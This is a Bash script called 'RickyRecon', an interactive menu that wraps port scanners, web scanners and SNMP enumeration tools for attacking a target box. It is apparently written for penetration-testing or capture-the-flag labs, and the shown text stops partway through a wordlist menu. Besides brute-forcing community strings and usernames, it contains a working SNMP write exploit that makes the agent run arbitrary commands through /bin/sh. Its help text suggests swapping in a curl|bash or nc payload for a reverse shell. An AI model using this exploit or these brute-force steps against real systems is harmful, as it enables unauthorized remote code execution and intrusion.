#!/usr/bin/env bash

# ─────────────────────────────────────────────
# RickyRecon - Interactive Reconnaissance Menu
# ─────────────────────────────────────────────

set -uo pipefail
export PATH="$HOME/.local/bin:$PATH"

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# Global variables (set during setup)
HOSTONLY=""
BASEURL=""
DIR=""
SETUP_COMPLETE=false
ALT_PORTS=()   # Additional web ports to scan (beyond 80/443)
SNMP_PORT=161  # SNMP port (default 161, configurable in SNMP menu)
FUZZ_WL="/usr/share/wordlists/dirb/big.txt"        # Directory fuzzing wordlist
PASS_WL="/usr/share/wordlists/rockyou.txt"          # Brute force password list

# ─────────────────────────────────────────────
# Banner
# ─────────────────────────────────────────────
show_banner() {
    clear
    echo -e "${GREEN}
██████╗  ██╗  ██████╗ ██╗  ██╗██╗   ██╗
██╔══██╗ ██║ ██╔════╝ ██║ ██╔╝╚██╗ ██╔╝
██████╔╝ ██║ ██║      █████╔╝  ╚████╔╝
██╔══██╗ ██║ ██║      ██╔═██╗   ╚██╔╝
██║  ██║ ██║ ╚██████╗ ██║  ██╗   ██║
╚═╝  ╚═╝ ╚═╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝
██████╗ ███████╗ ██████╗  ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝ ██╔═══██╗████╗  ██║
██████╔╝█████╗  ██║      ██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝  ██║      ██║   ██║██║╚██╗██║
██║  ██║███████╗╚██████╗ ╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
${PURPLE}                        Swift, Silent, Deadly${NC}"
    echo
}

# ─────────────────────────────────────────────
# Terminal launcher
# ─────────────────────────────────────────────
term() {
    local tmpf
    tmpf=$(mktemp /tmp/rickyrecon_XXXXXX.sh)
    printf '%s\n' "$1" > "$tmpf"
    local show="echo -e '\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m'; echo -e '\033[1;33m[CMD]\033[0m'; tr ';' '\n' < '$tmpf' | grep -Ev '^\s*(echo|#|$)' | sed '/^\s*$/d'; echo -e '\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m'; echo"
    local colorenv="export TERM=xterm-256color COLORTERM=truecolor FORCE_COLOR=1 CLICOLOR_FORCE=1;"
    if command -v gnome-terminal >/dev/null 2>&1; then
        gnome-terminal -- bash -lc "$colorenv $show; $1; echo; echo 'Done.'; rm -f '$tmpf'; exec bash"
    elif command -v x-terminal-emulator >/dev/null 2>&1; then
        x-terminal-emulator -e bash -lc "$colorenv $show; $1; echo; echo 'Done.'; rm -f '$tmpf'; exec bash"
    elif command -v xterm >/dev/null 2>&1; then
        xterm -e bash -lc "$colorenv $show; $1; echo; echo 'Done.'; rm -f '$tmpf'; exec bash" &
    elif command -v konsole >/dev/null 2>&1; then
        konsole -e bash -lc "$colorenv $show; $1; echo; echo 'Done.'; rm -f '$tmpf'; exec bash" &
    else
        echo -e "${RED}[!] No terminal emulator found; running inline:${NC}"
        bash -lc "export TERM=xterm-256color COLORTERM=truecolor; $1"
        rm -f "$tmpf"
    fi
}

# ─────────────────────────────────────────────
# Installer
# ─────────────────────────────────────────────
install_if_missing() {
    echo -e "${CYAN}[*] Checking for required tools...${NC}"

    # Format: "apt_package:binary_name" (use same name if they match)
    local apt_tools=(
        nmap:nmap nikto:nikto dirb:dirb gobuster:gobuster ffuf:ffuf
        python3-pip:pip3 wapiti:wapiti git:git
        rustscan:rustscan whatweb:whatweb nuclei:nuclei feroxbuster:feroxbuster
        dnsrecon:dnsrecon dirsearch:dirsearch
        curl:curl wget:wget snmp:snmpwalk snmp-check:snmp-check onesixtyone:onesixtyone
        snmp-mibs-downloader:download-mibs
        enum4linux:enum4linux-ng amass:amass subfinder:subfinder hydra:hydra
        ldap-utils:ldapsearch eyewitness:eyewitness
        wpscan:wpscan wafw00f:wafw00f arjun:arjun netexec:netexec responder:responder
        bloodyad:bloodyAD
    )

    local missing=()
    for entry in "${apt_tools[@]}"; do
        local pkg="${entry%%:*}"
        local bin="${entry##*:}"
        if ! command -v "$bin" &>/dev/null; then
            missing+=("$pkg")
        fi
    done

    # Check tools with non-matching binary names
    command -v theHarvester &>/dev/null || missing+=("theharvester")
    command -v searchsploit &>/dev/null || missing+=("exploitdb")

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[*] Missing tools: ${missing[*]}${NC}"
        read -rp "Install missing tools? (Y/N): " INSTALL
        if [[ "$INSTALL" =~ ^[Yy]$ ]]; then
            echo -e "${CYAN}[*] Updating apt cache...${NC}"
            sudo apt-get update -y
            for tool in "${missing[@]}"; do
                echo -e "${CYAN}[*] Installing $tool...${NC}"
                sudo apt-get install -y "$tool" || true
            done
        fi
    else
        echo -e "${GREEN}[+] All required tools are installed.${NC}"
    fi

    setup_snmp_mibs
}

setup_snmp_mibs() {
    local SNMP_CONF="/etc/snmp/snmp.conf"
    local needs_config=false

    # Install snmp-mibs-downloader if still missing after apt pass
    if ! command -v download-mibs &>/dev/null; then
        needs_config=true
        echo -e "${CYAN}[*] Configuring SNMP MIBs...${NC}"
        echo -e "${YELLOW}[*] Installing snmp-mibs-downloader...${NC}"
        sudo apt-get install -y snmp-mibs-downloader || {
            echo -e "${RED}[!] Failed to install snmp-mibs-downloader. MIB names may not resolve.${NC}"
            return
        }
    fi

    # Run download-mibs if IETF MIBs are not yet present
    if [[ ! -d /var/lib/mibs/ietf ]] || [[ -z "$(ls -A /var/lib/mibs/ietf 2>/dev/null)" ]]; then
        [[ "$needs_config" == false ]] && echo -e "${CYAN}[*] Configuring SNMP MIBs...${NC}"
        needs_config=true
        echo -e "${YELLOW}[*] Downloading SNMP MIBs (this may take a moment)...${NC}"
        sudo download-mibs || echo -e "${RED}[!] download-mibs encountered errors -- MIBs may be incomplete.${NC}"
    fi

    # Fix snmp.conf if needed
    if [[ -f "$SNMP_CONF" ]] && grep -q '^mibs :' "$SNMP_CONF"; then
        [[ "$needs_config" == false ]] && echo -e "${CYAN}[*] Configuring SNMP MIBs...${NC}"
        needs_config=true
        sudo sed -i 's/^mibs :$/# mibs :  # disabled by RickyRecon/' "$SNMP_CONF"
    fi

    if ! grep -q '^mibs +ALL' "$SNMP_CONF" 2>/dev/null; then
        [[ "$needs_config" == false ]] && echo -e "${CYAN}[*] Configuring SNMP MIBs...${NC}"
        needs_config=true
        echo 'mibs +ALL' | sudo tee -a "$SNMP_CONF" >/dev/null
    fi

    [[ "$needs_config" == true ]] && echo -e "${GREEN}[+] SNMP MIB configuration complete.${NC}"
}

# ─────────────────────────────────────────────
# Initial Setup
# ─────────────────────────────────────────────
initial_setup() {
    show_banner

    CURDIR="$(basename "$PWD")"

    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo -e "${CYAN}              INITIAL SETUP${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo

    read -rp "Is your current working directory named your target? (Y/N): " ANSWER
    if [[ "$ANSWER" =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}[+] User confirmed directory naming. Continuing...${NC}"
    elif [[ "$ANSWER" =~ ^[Nn]$ ]]; then
        echo -e "${RED}[-] Please cd into the directory named after the target box before running this tool.${NC}"
        echo -e "${RED}[-] Current directory: $CURDIR${NC}"
        exit 1
    else
        echo -e "${RED}[!] Invalid input. Please answer Y or N.${NC}"
        exit 1
    fi

    echo
    read -rp "Have you added the target IP to your /etc/hosts file? (Y/N): " ANSWER
    if [[ "$ANSWER" =~ ^[Nn]$ ]]; then
        echo -e "${RED}[-] Please add the IP and hostname to /etc/hosts before continuing.${NC}"
        echo "    Example:"
        echo "    10.10.10.10 target.local"
        exit 1
    elif [[ "$ANSWER" =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}[+] /etc/hosts entry confirmed. Continuing...${NC}"
    else
        echo -e "${RED}[!] Invalid input. Please answer Y or N.${NC}"
        exit 1
    fi

    echo
    read -rp "Enter target host or URL (e.g., example.com or https://example.com): " WEBTARGET
    WEBTARGET="${WEBTARGET//[[:space:]]/}"

    if [[ "$WEBTARGET" =~ ^https?:// ]]; then
        BASEURL="$WEBTARGET"
        HOSTONLY="${WEBTARGET#*://}"; HOSTONLY="${HOSTONLY%%/*}"
    else
        BASEURL="http://$WEBTARGET"
        HOSTONLY="$WEBTARGET"
    fi

    echo
    echo -e "${GREEN}[*] Target host: $HOSTONLY${NC}"
    echo -e "${GREEN}[*] Base URL:    $BASEURL${NC}"
    echo

    DIR="recon_reports_${HOSTNAME}"

    if [[ -d "$DIR" ]]; then
        echo -e "${YELLOW}Directory $DIR already exists. Continuing...${NC}"
    else
        echo "Directory $DIR does not exist. Creating it..."
        mkdir -p "$DIR"
        echo -e "${GREEN}Directory created. Continuing...${NC}"
    fi

    install_if_missing

    SETUP_COMPLETE=true
    echo
    echo -e "${GREEN}[+] Setup complete! Press Enter to continue to menu...${NC}"
    read -r
}

# ─────────────────────────────────────────────
# Tool Functions
# ─────────────────────────────────────────────

# ── Port Scanning ──
run_rustscan() {
    echo -e "${CYAN}[*] Launching RustScan...${NC}"
    term "echo '[*] Running RustScan...'; rustscan -a $HOSTONLY -b 500 -t 2000 --ulimit 5000 | tee $DIR/rustscan_${HOSTONLY}.txt; echo 'Output: $DIR/rustscan_${HOSTONLY}.txt'"
}

run_nmap_tcp() {
    echo -e "${CYAN}[*] Launching Nmap TCP Scan...${NC}"
    term "echo '[*] Running Nmap TCP Scan...'; sudo nmap -sV -sC -p- --script vuln $HOSTONLY -oN $DIR/nmap_${HOSTONLY}.txt; echo 'Output: $DIR/nmap_${HOSTONLY}.txt'"
}

run_nmap_udp() {
    echo -e "${CYAN}[*] Launching Nmap UDP Scan...${NC}"
    term "echo '[*] Running Nmap UDP Scan (Top 1000)...'; sudo nmap -sU -sV --top-ports 1000 --max-retries 2 --host-timeout 30m $HOSTONLY -oN $DIR/nmap_udp_${HOSTONLY}.txt; echo 'Output: $DIR/nmap_udp_${HOSTONLY}.txt'"
}

run_nmap_snmp() {
    echo -e "${CYAN}[*] Launching Nmap SNMP Scan (port $SNMP_PORT)...${NC}"
    term "echo '[*] Running Nmap SNMP UDP Scan on port $SNMP_PORT...'; sudo nmap -sU -p $SNMP_PORT --open --script snmp-info,snmp-brute,snmp-sysdescr,snmp-processes,snmp-netstat,snmp-interfaces $HOSTONLY -oN $DIR/nmap_snmp_${HOSTONLY}.txt; echo 'Output: $DIR/nmap_snmp_${HOSTONLY}.txt'"
}

# ── SNMP Enumeration ──
run_snmpwalk_public() {
    echo -e "${CYAN}[*] Launching SNMPWalk (public community) on port $SNMP_PORT...${NC}"
    term "echo '[*] Running SNMPWalk with public community string on port $SNMP_PORT...'; snmpwalk -v2c -c public $HOSTONLY:$SNMP_PORT 2>/dev/null | tee $DIR/snmpwalk_public_${HOSTONLY}.txt; echo 'Output: $DIR/snmpwalk_public_${HOSTONLY}.txt'"
}

run_snmpwalk_private() {
    echo -e "${CYAN}[*] Launching SNMPWalk (private community) on port $SNMP_PORT...${NC}"
    term "echo '[*] Running SNMPWalk with private community string on port $SNMP_PORT...'; snmpwalk -v2c -c private $HOSTONLY:$SNMP_PORT 2>/dev/null | tee $DIR/snmpwalk_private_${HOSTONLY}.txt; echo 'Output: $DIR/snmpwalk_private_${HOSTONLY}.txt'"
}

run_snmpwalk_extend() {
    echo -e "${CYAN}[*] Launching SNMPWalk (NET-SNMP-EXTEND-MIB) on port $SNMP_PORT...${NC}"
    term "echo '[*] Walking NET-SNMP-EXTEND-MIB::nsExtendObjects on port $SNMP_PORT...'; snmpwalk -v2c -c public $HOSTONLY:$SNMP_PORT NET-SNMP-EXTEND-MIB::nsExtendObjects 2>/dev/null | tee $DIR/snmpwalk_extend_${HOSTONLY}.txt; echo 'Output: $DIR/snmpwalk_extend_${HOSTONLY}.txt'"
}

run_snmpwalk_ucd_exec() {
    echo -e "${CYAN}[*] Launching SNMPWalk (UCD-SNMP-MIB extTable)...${NC}"
    term "echo '[*] Walking UCD-SNMP-MIB::extTable on port $SNMP_PORT...';
    echo '[i] This targets the OLDER snmpd.conf \"exec\" directive (separate from \"extend\").';
    echo '[i] Look for: extNames (script labels), extCommand (full binary path), extOutput (live output).';
    echo '[i] If extOutput returns command results, the agent is executing scripts and output is readable via SNMP.';
    echo '[i] Cross-reference with nsExtendObjects output -- different config directive, different OID tree.';
    echo;
    snmpwalk -v2c -c public $HOSTONLY:$SNMP_PORT UCD-SNMP-MIB::extTable 2>/dev/null | tee $DIR/snmpwalk_ucd_exec_${HOSTONLY}.txt;
    echo; echo 'Output: $DIR/snmpwalk_ucd_exec_${HOSTONLY}.txt'"
}

run_snmpv3_userenum() {
    echo -e "${CYAN}[*] Launching SNMPv3 User Enumeration on port $SNMP_PORT...${NC}"
    term "echo '[*] Enumerating SNMPv3 usernames on port $SNMP_PORT...';
    echo '[i] SNMPv3 leaks valid usernames via different error responses:';
    echo '[i]   Valid user   -> unknownEngineID (authentication challenge issued)';
    echo '[i]   Invalid user -> unknownUserName (rejected immediately)';
    echo '[i] Any username NOT showing unknownUserName is a candidate -- verify manually with snmpwalk -v3.';
    echo '[i] Found valid users? Try: snmpwalk -v3 -u <user> -l authPriv -a MD5 -A <pass> -x DES -X <pass> $HOSTONLY:$SNMP_PORT';
    echo;
    WLIST='/usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt';
    if [ ! -f \"\$WLIST\" ]; then WLIST='/usr/share/seclists/Usernames/top-usernames-shortlist.txt'; fi;
    if [ ! -f \"\$WLIST\" ]; then
        echo 'admin administrator root user snmpuser snmpv3 monitor operator manager backup service' | tr ' ' '\n' > /tmp/snmpv3_users.txt;
        WLIST='/tmp/snmpv3_users.txt';
    fi;
    echo \"[*] Using wordlist: \$WLIST\"; echo;
    FOUND=0;
    while IFS= read -r user; do
        result=\$(snmpwalk -v3 -u \"\$user\" -l noAuthNoPriv $HOSTONLY:$SNMP_PORT 2>&1);
        if ! echo \"\$result\" | grep -qi 'unknownUserName'; then
            echo \"[+] Possible valid SNMPv3 user: \$user\";
            echo \"\$user\" >> $DIR/snmpv3_valid_users_${HOSTONLY}.txt;
            FOUND=1;
        fi;
    done < \"\$WLIST\";
    if [ \$FOUND -eq 0 ]; then echo '[-] No valid SNMPv3 users found with this wordlist.'; fi;
    echo; echo 'Valid users saved to: $DIR/snmpv3_valid_users_${HOSTONLY}.txt'"
}

run_snmpset_rce() {
    echo -e "${YELLOW}[!] SNMP Write RCE - Requires a writable community string (found via OneSixtyOne).${NC}"
    read -rp "  Enter write community string: " SNMP_WRITE_COMM
    if [[ -z "$SNMP_WRITE_COMM" ]]; then
        echo -e "${RED}[!] No community string provided. Aborting.${NC}"
        return
    fi
    read -rp "  Enter command to execute (e.g. id, whoami, hostname): " RCE_CMD
    if [[ -z "$RCE_CMD" ]]; then
        echo -e "${RED}[!] No command provided. Aborting.${NC}"
        return
    fi
    local EXTEND_NAME="rrecon$$"
    echo -e "${CYAN}[*] Attempting SNMP write RCE via NET-SNMP-EXTEND-MIB...${NC}"
    term "echo '[*] SNMP Write RCE via NET-SNMP-EXTEND-MIB::nsExtendObjects';
    echo '[i] Step 1: Writing new extend entry \"$EXTEND_NAME\" with command: $RCE_CMD';
    echo '[i] Step 2: Reading output back via nsExtendOutput.';
    echo '[i] If Step 1 succeeds (no error), the agent has write access and RCE is confirmed.';
    echo '[i] For reverse shell: replace command with a curl|bash or nc payload.';
    echo '[i] Clean up after: snmpset -v2c -c $SNMP_WRITE_COMM $HOSTONLY:$SNMP_PORT NET-SNMP-EXTEND-MIB::nsExtendStatus.\"$EXTEND_NAME\" i 6';
    echo;
    echo '[*] Writing extend entry...';
    snmpset -v2c -c $SNMP_WRITE_COMM $HOSTONLY:$SNMP_PORT \
        'NET-SNMP-EXTEND-MIB::nsExtendStatus.\"$EXTEND_NAME\"' i 4 \
        'NET-SNMP-EXTEND-MIB::nsExtendCommand.\"$EXTEND_NAME\"' s '/bin/sh' \
        'NET-SNMP-EXTEND-MIB::nsExtendArgs.\"$EXTEND_NAME\"' s '-c \"$RCE_CMD\"' 2>&1 | grep -Ev 'Cannot find module|Did not find|Bad operator|MIB search path' | tee $DIR/snmpset_rce_write_${HOSTONLY}.txt;
    echo;
    echo '[*] Reading command output...';
    snmpwalk -v2c -c public $HOSTONLY:$SNMP_PORT 'NET-SNMP-EXTEND-MIB::nsExtendOutput' 2>/dev/null | tee $DIR/snmpset_rce_output_${HOSTONLY}.txt;
    echo; echo 'Output: $DIR/snmpset_rce_output_${HOSTONLY}.txt'"
}

run_disman_enum() {
    echo -e "${CYAN}[*] Launching DISMAN-EVENT-MIB Enumeration on port $SNMP_PORT...${NC}"
    term "echo '[*] Enumerating DISMAN-EVENT-MIB on port $SNMP_PORT...';
    echo '[i] DISMAN-EVENT-MIB allows scheduling and executing actions on the agent.';
    echo '[i] Look for existing mteTrigger/mteEvent entries -- these are configured automation tasks.';
    echo '[i] If the MIB is writable (write community known), you can inject commands via mteEventSetTable.';
    echo '[i] Accessible MIB + write access = arbitrary command execution as the snmpd process user.';
    echo '[i] No output here? Try option 9 (snmpset RCE) first to confirm write access.';
    echo;
    echo '[*] Walking mteTriggerTable...';
    snmpwalk -v2c -c public $HOSTONLY:$SNMP_PORT DISMAN-EVENT-MIB::mteTriggerTable 2>/dev/null | tee $DIR/disman_trigger_${HOSTONLY}.txt;
    echo;
    echo '[*] Walking mteEventTable...';
    snmpwalk -v2c -c public $HOSTONLY:$SNMP_PORT DISMAN-EVENT-MIB::mteEventTable 2>/dev/null | tee -a $DIR/disman_trigger_${HOSTONLY}.txt;
    echo;
    echo '[*] Walking mteObjectsTable...';
    snmpwalk -v2c -c public $HOSTONLY:$SNMP_PORT DISMAN-EVENT-MIB::mteObjectsTable 2>/dev/null | tee -a $DIR/disman_trigger_${HOSTONLY}.txt;
    echo; echo 'Output: $DIR/disman_trigger_${HOSTONLY}.txt'"
}

run_onesixtyone() {
    echo -e "${CYAN}[*] Launching OneSixtyOne on port $SNMP_PORT...${NC}"
    term "echo '[*] Running OneSixtyOne community string brute force on port $SNMP_PORT...'; SNMPLIST='/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt'; if [ ! -f \"\$SNMPLIST\" ]; then SNMPLIST='/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt'; fi; if [ ! -f \"\$SNMPLIST\" ]; then echo 'public\nprivate\ncommunity\nmanager\nadmin\ndefault\npassword\nsnmp\ntest' > /tmp/snmp_communities.txt; SNMPLIST='/tmp/snmp_communities.txt'; fi; onesixtyone -c \$SNMPLIST -p $SNMP_PORT $HOSTONLY | tee $DIR/onesixtyone_${HOSTONLY}.txt; echo 'Output: $DIR/onesixtyone_${HOSTONLY}.txt'"
}

run_snmpcheck() {
    echo -e "${CYAN}[*] Launching SNMP-Check on port $SNMP_PORT...${NC}"
    term "echo '[*] Running SNMP-Check on port $SNMP_PORT...'; snmp-check -p $SNMP_PORT $HOSTONLY | tee $DIR/snmpcheck_${HOSTONLY}.txt; echo 'Output: $DIR/snmpcheck_${HOSTONLY}.txt'"
}

run_all_snmp() {
    echo -e "${YELLOW}[*] Launching ALL SNMP Enumeration tools...${NC}"
    run_nmap_snmp
    run_onesixtyone
    run_snmpwalk_public
    run_snmpcheck
    run_snmpwalk_extend
    run_snmpwalk_ucd_exec
    run_snmpv3_userenum
    echo -e "${GREEN}[+] All SNMP enumeration tools launched (passive recon only -- options 9/10 require manual run)!${NC}"
}

# ── Alt Port Helpers ──

# Build a URL for a given port (https for 443/8443, http otherwise)
url_for_port() {
    local port="$1"
    case "$port" in
        443|8443) echo "https://${HOSTONLY}:${port}" ;;
        80)       echo "http://${HOSTONLY}" ;;
        *)        echo "http://${HOSTONLY}:${port}" ;;
    esac
}

# Return a filename suffix like "_port8080" (empty for 80/443)
_url_port_suffix() {
    local url="$1"
    local host="${url#*://}"; host="${host%%/*}"
    if [[ "$host" =~ :([0-9]+)$ ]]; then
        local port="${BASH_REMATCH[1]}"
        [[ "$port" != "80" && "$port" != "443" ]] && echo "_port${port}"
    fi
}

# Run a scanning function once per configured alt port
run_on_alt_ports() {
    local fn="$1"
    if [[ ${#ALT_PORTS[@]} -eq 0 ]]; then return; fi
    for port in "${ALT_PORTS[@]}"; do
        local alt_url; alt_url=$(url_for_port "$port")
        echo -e "${CYAN}[*] Also running on port $port ($alt_url)...${NC}"
        "$fn" "$alt_url"
    done
}

# Interactive alt port manager
manage_alt_ports() {
    while true; do
        show_banner
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${BLUE}       ALTERNATE WEB PORT CONFIGURATION${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY${NC}"
        echo
        if [[ ${#ALT_PORTS[@]} -gt 0 ]]; then
            echo -e "${GREEN}[+] Current alt ports: ${ALT_PORTS[*]}${NC}"
            echo -e "${YELLOW}    URLs that will be scanned:${NC}"
            for p in "${ALT_PORTS[@]}"; do
                echo -e "      $(url_for_port "$p")"
            done
        else
            echo -e "${YELLOW}[*] No alternate ports configured.${NC}"
            echo -e "    Only the primary target ($BASEURL) will be scanned."
        fi
        echo
        echo -e "  ${GREEN}1)${NC} Add port(s)"
        echo -e "  ${GREEN}2)${NC} Remove a port"
        echo -e "  ${GREEN}3)${NC} Clear all alt ports"
        echo -e "  ${RED}B)${NC} Back"
        echo
        read -rp "Select option: " choice
        case $choice in
            1)
                read -rp "Enter port(s) to add (space-separated, e.g. 8080 8443 8888): " -a NEW_PORTS
                for p in "${NEW_PORTS[@]}"; do
                    if [[ "$p" =~ ^[0-9]+$ ]] && (( p >= 1 && p <= 65535 )); then
                        ALT_PORTS+=("$p")
                        echo -e "${GREEN}[+] Added port $p${NC}"
                    else
                        echo -e "${RED}[!] Invalid port: $p (skipped)${NC}"
                    fi
                done
                ;;
            2)
                if [[ ${#ALT_PORTS[@]} -eq 0 ]]; then
                    echo -e "${RED}[!] No alt ports configured.${NC}"
                else
                    echo "Current alt ports: ${ALT_PORTS[*]}"
                    read -rp "Enter port to remove: " RM_PORT
                    local new_ports=()
                    for p in "${ALT_PORTS[@]}"; do
                        [[ "$p" != "$RM_PORT" ]] && new_ports+=("$p")
                    done
                    ALT_PORTS=("${new_ports[@]}")
                    echo -e "${GREEN}[+] Updated alt ports: ${ALT_PORTS[*]:-none}${NC}"
                fi
                ;;
            3)
                ALT_PORTS=()
                echo -e "${GREEN}[+] Alt ports cleared.${NC}"
                ;;
            [Bb]) return ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac
        echo
        read -rp "Press Enter to continue..."
    done
}

# ── Web Scanning ──
run_nikto() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    # Extract host and optional port for nikto's -h / -p flags
    local h="${url#*://}"; h="${h%%/*}"
    local port_flag=""
    if [[ "$h" =~ :([0-9]+)$ ]]; then
        port_flag="-p ${BASH_REMATCH[1]}"
        h="${h%:*}"
    fi
    echo -e "${CYAN}[*] Launching Nikto${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Nikto on $url...'; nikto -h $h $port_flag | tee $DIR/nikto_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/nikto_${HOSTONLY}${sfx}.txt'"
}

run_wapiti() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching Wapiti${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Wapiti on $url...'; wapiti -u $url -f html -o $DIR/wapiti_report${sfx}"
}

run_whatweb() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching WhatWeb${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running WhatWeb on $url...'; whatweb $url | tee $DIR/whatweb_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/whatweb_${HOSTONLY}${sfx}.txt'"
}

run_nuclei() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching Nuclei${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Nuclei on $url...'; nuclei -u $url -severity low,medium,high,critical -o $DIR/nuclei_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/nuclei_${HOSTONLY}${sfx}.txt'"
}

run_wpscan() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching WPScan${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running WPScan on $url...'; wpscan --url $url -e ap,at,u --no-banner | tee $DIR/wpscan_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/wpscan_${HOSTONLY}${sfx}.txt'"
}

run_wafw00f() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching Wafw00f${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Wafw00f on $url...'; wafw00f $url | tee $DIR/wafw00f_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/wafw00f_${HOSTONLY}${sfx}.txt'"
}

run_arjun() {
    local url="${1:-$BASEURL}"
    local sfx; sfx=$(_url_port_suffix "$url")
    echo -e "${CYAN}[*] Launching Arjun${sfx:+ (port ${sfx#_port})}...${NC}"
    term "echo '[*] Running Arjun on $url...'; arjun -u $url | tee $DIR/arjun_${HOSTONLY}${sfx}.txt; echo 'Output: $DIR/arjun_${HOSTONLY}${sfx}.txt'"
}

# ── Wordlist Selection ──
select_fuzz_wordlist() {
    show_banner
    echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
    echo -e "${BLUE}        SELECT FUZZING WORDLIST${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Current: $FUZZ_WL${NC}"
    echo
    echo -e "  ${GREEN}1)${NC} dirb/common.txt                          (~4k)    Fast recon"
    echo -e "  ${GREEN}2)${NC} dirb/big.txt                             (~20k)   Default"
    echo -e "  ${GREEN}3)${NC} dirbuster/directory-list-2.3-small.txt  (~87k)"
    echo -e "  ${GREEN}4)${NC} dirbuster/directory-list-2.3-medium.txt (~220k)"
    echo -e "  ${GREEN}5)${NC} dirbuster/directory-list-2.3-big.txt    (~1.2M)"
    echo -e "  ${GREEN}6)${NC} seclists/Web-Content/common.txt                  SecLists common"
    echo -e "  ${GREEN}7)${NC} seclists/Web-Content/raft-medium-directories.txt (~30k)"
    echo -e "  ${GREEN}8)${NC} seclists/Web-Content/raft-large-directories.txt  (~73k)"
    echo -e "  ${GREEN}9)${NC} seclists/Web-Content/quickhits.txt               Quick wins / sensitive files"
    echo -e "  ${RED}B)${NC} Cancel"
    echo
    read -rp "Select wordlist: " wl_choice
    local new_wl
    case $wl_choice in
        1) new_wl="/usr/share/wordlists/dirb/common.txt" ;;
        2) new_wl="/usr/share/wordlists/dirb/big.txt" ;;
        3) new_wl="/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt" ;;
        4) new_wl="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" ;;
        5) new_wl="/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt" ;;
        6) new_wl="/usr/share/seclists/Discovery/Web-Content/common.txt" ;;
        7) new_wl="/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" ;;
        8) new_wl="/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt" ;;
        9) new_wl="/usr/share/seclists/Discovery/Web-Content/quickhits.txt" ;;
        [Bb]) return ;;
        *) echo -e "${RED}Invalid option, keeping current wordlist.${NC}"; return ;;
    esac
    if [[ ! -f "$new_wl" ]]; then
        echo -e "${RED}[!] Wordlist not found: $new_wl${NC}"
        echo -e "${YELLOW}[*] Keeping current: $FUZZ_WL${NC}"
    else
        FUZZ_WL="$new_wl"
        echo -e "${GREEN}[+] Fuzzing wordlist set to: $FUZZ_WL${NC}"
    fi
}

select_pass_wordlist() {
    show_banner
    echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
    echo -e "${BLUE}        SELECT PASSWORD WORDLIST${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Current: $PASS_WL${NC}"
    echo
    echo -e "  ${GREEN}1)${NC} rockyou.txt                                    (14M)  Default"
    echo -e "  ${GREEN}2)${NC} fasttrack.txt                                  (~200) Common passwords"
    echo -e "  ${GREEN}3)${NC} seclists/Passwords/Common-Credentials/10k-most-common.txt"
    echo -e "  ${GREEN}4)${NC} seclists/Passwords/Common-Credentials/100k-most-common.txt"
    echo -e "  ${GREEN}5)${NC} seclists/Passwords/darkweb2017-top10000.txt"
    echo -e "  ${GREEN}6)${NC} metasploit/password.lst"
    echo -e "  ${RED}B)${NC} Cancel"
    echo
    read -rp "Select wordlist: " wl_choice
    local new_wl
    case $wl_choice in
        1) new_wl="/usr/share/wordlists/rockyou.txt" ;;
        2) new_wl="/usr/share/wordlists/fasttrack.txt" ;;
        3) new_wl="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt" ;;
        4) new_wl="/usr/share/seclists/Passwords/Common-Credentials/100k-most-common.txt" ;;
        5) new_wl="/usr/share/seclists/Passwords/darkweb2017-top10000.txt" ;;
